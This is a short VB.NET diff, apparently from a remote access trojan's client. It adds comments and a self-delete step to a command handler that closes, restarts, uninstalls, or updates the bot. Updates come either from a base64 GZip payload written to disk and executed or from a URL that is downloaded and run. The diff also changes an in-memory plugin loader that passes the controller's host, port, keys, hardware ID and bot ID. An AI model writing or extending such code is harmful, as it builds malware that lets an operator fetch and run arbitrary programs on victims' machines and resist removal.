@@ -27,27 +27,32 @@
 
                     Case "CL-"
                         Select Case A(1)
-                            Case "1"
+                            Case "1" 'close
                                 C_CriticalProcesses.CriticalProcesses_Disable()
                                 End
-                            Case "2"
+
+                            Case "2" 'restart
                                 C_CriticalProcesses.CriticalProcesses_Disable()
                                 Diagnostics.Process.Start(C_Settings.fullpath)
                                 End
-                            Case "3"
+
+                            Case "3" 'uni
                                 C_Installation.DEL()
-                            Case "4"
+
+                            Case "4" 'update disk
                                 Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(2))
                                 IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(3)), False))
                                 Threading.Thread.CurrentThread.Sleep(1000)
                                 Diagnostics.Process.Start(NewFile)
                                 C_Installation.DEL()
-                            Case "5"
+
+                            Case "5" 'update url
                                 Dim NewFile = IO.Path.GetTempFileName + A(3)
                                 Dim WC As New Net.WebClient
                                 WC.DownloadFile(A(2), NewFile)
                                 Threading.Thread.CurrentThread.Sleep(1000)
                                 Diagnostics.Process.Start(NewFile)
+                                C_Installation.DEL()
                         End Select
 
                     Case "Visit"
@@ -92,7 +97,7 @@
                 For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                     For Each GM In Type_.GetMethods
                         If GM.Name = "CN" Then
-                            GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.PASS, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
+                            GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.EncryptionKey, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                         End If
                     Next
                 Next
